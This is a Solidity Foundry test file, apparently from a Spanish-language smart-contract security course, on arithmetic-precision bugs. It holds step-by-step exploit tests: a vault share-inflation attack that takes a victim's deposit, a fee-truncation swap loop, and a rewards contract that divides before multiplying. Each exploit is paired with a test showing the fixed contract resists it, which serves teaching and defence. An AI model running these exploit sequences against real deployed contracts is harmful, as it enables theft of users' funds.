// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {BaseChallenge} from "./base/BaseChallenge.t.sol";
import {MiniToken} from "../src/C7-oraculo-flashloan/Vulnerable.sol";
import {
    VaultVulnerable,
    CambioVulnerable,
    RepartoVulnerable
} from "../src/C8-aritmetica-precision/Vulnerable.sol";
import {VaultFixed, CambioFixed, RepartoFixed} from "../src/C8-aritmetica-precision/Fixed.sol";

contract C8_AritmeticaPrecision is BaseChallenge {
    MiniToken asset;

    function setUp() public override {
        super.setUp();
        asset = new MiniToken("ASSET");
        asset.mint(attacker, 2000e18);
        asset.mint(user1, 500e18); // la víctima
    }

    function test_Exploit_Vulnerable() public {
        VaultVulnerable vault = new VaultVulnerable(address(asset));

        vm.startPrank(attacker);
        asset.approve(address(vault), type(uint256).max);
        // 1. Primer depósito mínimo: 1 wei -> 1 share.
        vault.deposit(1);
        // 2. Donación directa para inflar totalAssets.
        asset.transfer(address(vault), 1000e18);
        vm.stopPrank();

        // 3. La víctima deposita 500e18: sus shares se truncan a 0.
        vm.startPrank(user1);
        asset.approve(address(vault), type(uint256).max);
        uint256 sharesVictima = vault.deposit(500e18);
        vm.stopPrank();
        assertEq(sharesVictima, 0, "la victima recibe 0 shares (truncamiento)");

        // 4. El atacante redime su unica share y se lleva (casi) todo.
        uint256 antes = asset.balanceOf(attacker);
        vm.prank(attacker);
        vault.redeem(1);
        uint256 ganancia = asset.balanceOf(attacker) - antes;

        // Recupera su donación + casi todo el depósito de la víctima.
        assertGt(ganancia, 1400e18, "el atacante roba el deposito de la victima");
        assertEq(vault.shares(user1), 0, "la victima no tiene shares");
    }

    function test_Fixed_Resiste() public {
        VaultFixed vault = new VaultFixed(address(asset));

        vm.startPrank(attacker);
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(1);
        asset.transfer(address(vault), 1000e18); // donación
        vm.stopPrank();

        // Con offset virtual, la víctima SÍ recibe shares representativas.
        vm.startPrank(user1);
        asset.approve(address(vault), type(uint256).max);
        uint256 sharesVictima = vault.deposit(500e18);
        vm.stopPrank();
        assertGt(sharesVictima, 0, "la victima recibe shares (sin truncar)");

        // El atacante canjea TODAS sus shares (no solo una).
        uint256 sharesAtacante = vault.shares(attacker);
        uint256 antes = asset.balanceOf(attacker);
        vm.prank(attacker);
        vault.redeem(sharesAtacante);
        uint256 recuperado = asset.balanceOf(attacker) - antes;

        // El ataque deja de ser rentable: el atacante recupera menos de lo que
        // aportó (1 wei + 1000e18 donados); pierde aprox. la mitad de la donación.
        assertLt(recuperado, 1000e18, "el ataque no es rentable");

        // La víctima recupera casi todo su depósito (pérdida por redondeo < 1%).
        uint256 sharesVictimaFinal = vault.shares(user1);
        vm.prank(user1);
        uint256 devuelto = vault.redeem(sharesVictimaFinal);
        assertGt(devuelto, 495e18, "la victima conserva su deposito");
    }
    // Variante B: redondeo a favor del usuario

    function test_Exploit_Redondeo_Vulnerable() public {
        MiniToken a = new MiniToken("A");
        MiniToken b = new MiniToken("B");
        CambioVulnerable cambio = new CambioVulnerable(address(a), address(b));

        // Liquidez de salida (tokenB) en el contrato.
        b.mint(address(cambio), 1000e18);
        // El atacante tiene tokenA para intercambiar.
        a.mint(attacker, 1000e18);

        vm.startPrank(attacker);
        a.approve(address(cambio), type(uint256).max);

        // Con amount = 333, la comisión 333*30/10000 = 0,999 trunca a 0: gratis.
        uint256 recibidoAntes = b.balanceOf(attacker);
        for (uint256 i = 0; i < 1000; i++) {
            cambio.cambiar(333);
        }
        uint256 recibido = b.balanceOf(attacker) - recibidoAntes;
        uint256 pagado = 333 * 1000;
        vm.stopPrank();

        assertEq(recibido, pagado, "el atacante recibe tanto como paga: comision 0");
    }

    function test_Fixed_Redondeo_Resiste() public {
        MiniToken a = new MiniToken("A");
        MiniToken b = new MiniToken("B");
        CambioFixed cambio = new CambioFixed(address(a), address(b));
        b.mint(address(cambio), 1000e18);
        a.mint(attacker, 1000e18);

        vm.startPrank(attacker);
        a.approve(address(cambio), type(uint256).max);

        // Ahora cada intercambio cobra al menos 1 de comisión (ceil).
        uint256 recibidoAntes = b.balanceOf(attacker);
        for (uint256 i = 0; i < 1000; i++) {
            cambio.cambiar(333);
        }
        uint256 recibido = b.balanceOf(attacker) - recibidoAntes;
        uint256 pagado = 333 * 1000;
        vm.stopPrank();

        assertLt(recibido, pagado, "el usuario siempre paga la comision");
        assertEq(pagado - recibido, 1000, "una unidad de comision por intercambio");
    }

    // Variante C: división antes de multiplicación

    /// @notice Escenario común: dos personas depositan 600.000 y 400.000 tokens
    /// y el protocolo reparte 1.500.000 tokens de recompensa.
    function _escenarioReparto(address reparto) internal returns (MiniToken t) {
        t = MiniToken(address(RepartoVulnerable(reparto).token()));
        t.mint(user1, 600_000e18);
        t.mint(user2, 400_000e18);
        t.mint(deployer, 1_500_000e18);
        vm.startPrank(user1);
        t.approve(reparto, type(uint256).max);
        RepartoVulnerable(reparto).depositar(600_000e18);
        vm.stopPrank();
        vm.startPrank(user2);
        t.approve(reparto, type(uint256).max);
        RepartoVulnerable(reparto).depositar(400_000e18);
        vm.stopPrank();
        vm.startPrank(deployer);
        t.approve(reparto, type(uint256).max);
        RepartoVulnerable(reparto).notificarRecompensa(1_500_000e18);
        vm.stopPrank();
    }

    function test_Exploit_DivisionAntesMultiplicacion_Vulnerable() public {
        MiniToken t = new MiniToken("STK");
        RepartoVulnerable reparto = new RepartoVulnerable(address(t));
        _escenarioReparto(address(reparto));

        // 1.500.000 / 1.000.000 trunca a 1 token por token depositado: solo se
        // reparte 1.000.000 y 500.000 quedan bloqueados en el contrato.
        assertEq(reparto.pendiente(user1), 600_000e18, "user1 recibe 600.000 en lugar de 900.000");
        assertEq(reparto.pendiente(user2), 400_000e18, "user2 recibe 400.000 en lugar de 600.000");

        vm.prank(user1);
        reparto.cobrar();
        vm.prank(user2);
        reparto.cobrar();
        assertEq(
            t.balanceOf(address(reparto)) - reparto.totalDepositado(),
            500_000e18,
            "un tercio de la recompensa queda bloqueado para siempre"
        );

        // Con una recompensa menor que el total depositado no se reparte nada.
        t.mint(deployer, 900_000e18);
        vm.prank(deployer);
        reparto.notificarRecompensa(900_000e18);
        assertEq(reparto.pendiente(user1), 0, "una recompensa menor que el total se pierde entera");
    }

    function test_Fixed_DivisionAntesMultiplicacion_Resiste() public {
        MiniToken t = new MiniToken("STK");
        RepartoFixed reparto = new RepartoFixed(address(t));
        _escenarioReparto(address(reparto));

        assertEq(reparto.pendiente(user1), 900_000e18, "user1 cobra su parte exacta");
        assertEq(reparto.pendiente(user2), 600_000e18, "user2 cobra su parte exacta");

        vm.prank(user1);
        reparto.cobrar();
        vm.prank(user2);
        reparto.cobrar();
        assertEq(
            t.balanceOf(address(reparto)),
            reparto.totalDepositado(),
            "no queda recompensa bloqueada"
        );

        // Una recompensa menor que el total depositado también se reparte.
        t.mint(deployer, 900_000e18);
        vm.prank(deployer);
        reparto.notificarRecompensa(900_000e18);
        assertEq(reparto.pendiente(user1), 540_000e18, "60 % de 900.000");
    }
}
